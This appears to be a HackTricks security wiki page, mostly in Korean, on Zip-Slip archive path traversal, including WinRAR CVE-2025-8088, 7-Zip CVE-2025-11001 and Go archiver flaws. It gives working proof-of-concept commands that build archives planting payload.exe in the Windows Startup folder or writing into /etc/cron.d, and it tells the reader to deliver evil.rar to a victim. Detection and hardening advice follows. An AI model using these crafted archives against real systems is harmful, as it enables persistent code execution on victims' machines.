# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 개요

많은 아카이브 형식(ZIP, RAR, TAR, 7-ZIP 등)은 각 항목이 자체 **internal path**를 가질 수 있습니다. 추출 유틸리티가 그 경로를 그대로 신뢰하면, `..`을 포함하거나 **절대 경로**(예: `C:\Windows\System32\`)를 가진 조작된 파일명이 사용자가 선택한 디렉토리 밖에 기록될 수 있습니다.
이 취약성 계열은 널리 *Zip-Slip* 또는 **archive extraction path traversal**로 알려져 있습니다.

결과로는 임의 파일 덮어쓰기부터 Windows *Startup* 폴더와 같은 **auto-run** 위치에 페이로드를 떨어뜨려 직접 **remote code execution (RCE)**을 달성하는 것까지 다양합니다.

## 근본 원인

1. 공격자는 하나 이상의 파일 헤더에 다음을 포함하는 아카이브를 생성합니다:
* 상대 경로 탐색 시퀀스 (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* 절대 경로 (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* 또는 대상 디렉토리 밖으로 해석되는 조작된 **symlinks** (ZIP/TAR의 *nix*에서 흔함).
2. 피해자는 임베디드 경로를 신뢰하거나(또는 symlinks를 따라) 이를 정화하거나 선택한 디렉토리 아래로 강제 추출하지 않는 취약한 도구로 아카이브를 추출합니다.
3. 파일이 공격자가 제어하는 위치에 기록되며 시스템이나 사용자가 해당 경로를 트리거할 때 다음에 실행/로딩됩니다.

### .NET `Path.Combine` + `ZipArchive` traversal

일반적인 .NET 안티패턴은 의도된 대상 경로를 **사용자 제어(user-controlled)** `ZipArchiveEntry.FullName`과 결합하고 경로 정규화 없이 추출하는 것입니다:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName`이 `..\\`로 시작하면 상위 디렉터리로 이동(경로 순회)이 발생합니다; 만약 그것이 **절대 경로**라면 왼쪽 구성 요소가 완전히 무시되어 추출 대상이 **임의의 파일 쓰기**가 됩니다.
- 스케줄러가 감시하는 형제 디렉터리 `app`에 쓰기하기 위한 개념 증명 아카이브:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
해당 ZIP을 모니터링되는 인박스에 넣으면 `C:\samples\app\0xdf.txt`가 생성되어 `C:\samples\queue\` 밖으로의 traversal가 입증되고 follow-on primitives(예: DLL hijacks)를 가능하게 합니다.

## 실제 사례 – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows용 WinRAR (including the `rar` / `unrar` CLI, the DLL and the portable source)은 압축 해제 중 파일명을 검증하지 않았습니다.
악의적인 RAR 아카이브가 다음과 같은 항목을 포함하면:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
선택된 출력 디렉터리의 **외부**에 위치하여 사용자의 *Startup* 폴더 안에 들어갑니다. 로그온 후 Windows는 그곳에 있는 모든 항목을 자동으로 실행하여 *persistent* RCE를 제공합니다.

### PoC 아카이브 제작 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – 파일 경로를 주어진 그대로 저장 (선두의 `./`를 **제거하지 마십시오**).

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### 실전에서 관찰된 악용 사례

ESET은 RomCom (Storm-0978/UNC2596) 스피어피싱 캠페인에서 RAR 아카이브가 CVE-2025-8088을 악용하여 맞춤형 백도어를 배포하고 랜섬웨어 작전을 지원하는 사례를 보고했습니다.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP 항목이 **symbolic links**일 때 추출 중 참조가 해제되어, 공격자가 대상 디렉터리를 벗어나 임의 경로를 덮어쓸 수 있습니다. 사용자 상호작용은 아카이브를 *열거나/추출하는 것*뿐입니다.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: `Start Menu/Programs/Startup` 또는 서비스로 실행되는 위치를 덮어쓰기 → 다음 로그인 또는 서비스 재시작 시 코드가 실행됩니다.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
패치된 빌드에서는 `/etc/cron.d`가 변경되지 않으며; symlink는 /tmp/target 내부에 링크로 추출됩니다.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()`가 `../` 및 symlinked ZIP 항목을 따라가 outputDir 밖에 기록합니다.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: `mholt/archives` ≥ 0.1.0로 전환하거나 쓰기 전에 canonical-path 검사를 구현하세요.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## 탐지 팁

* **정적 검사** – 아카이브 항목을 나열하고 `../`, `..\\`, *absolute paths* (`/`, `C:`)를 포함하거나, 추출 디렉터리 밖을 가리키는 *symlink* 타입 항목이 있으면 플래그를 세우세요.
* **정규화** – `realpath(join(dest, name))`가 여전히 `dest`로 시작하는지 확인하세요. 그렇지 않으면 거부합니다.
* **샌드박스 추출** – disposable 디렉터리로 안전한 추출기(예: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00)를 사용해 압축을 풀고 결과 경로들이 디렉터리 내부에 머무는지 검증하세요.
* **엔드포인트 모니터링** – WinRAR/7-Zip 등으로 아카이브가 열린 직후 `Startup`/`Run`/`cron` 위치에 새 실행 파일이 쓰이면 알림을 발생시키세요.

## 완화 및 하드닝

1. **추출기 업데이트** – WinRAR 7.13+ 및 7-Zip 25.00+는 경로/심볼릭 링크 정화 기능을 구현합니다. 두 도구 모두 자동 업데이트 기능은 부족합니다.
2. 가능하면 아카이브를 “**Do not extract paths**” / “**Ignore paths**” 옵션으로 추출하세요.
3. Unix에서는 추출 전에 권한을 낮추고 **chroot/namespace**를 마운트하세요; Windows에서는 **AppContainer** 또는 샌드박스를 사용하세요.
4. 커스텀 코드를 작성하는 경우 생성/쓰기 전에 `realpath()`/`PathCanonicalize()`로 정규화하고, 대상 디렉터리를 벗어나는 항목은 거부하세요.

## 추가 영향 / 역사적 사례

* 2018 – 다수의 Java/Go/JS 라이브러리에 영향을 준 대규모 *Zip-Slip* 권고.
* 2023 – 7-Zip CVE-2023-4011, `-ao` 병합 중 유사한 traversal.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) slugs의 TAR 추출 경로 탈출 (v1.2에서 패치).
* PathCanonicalize / realpath를 호출하지 않는 모든 커스텀 추출 로직.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
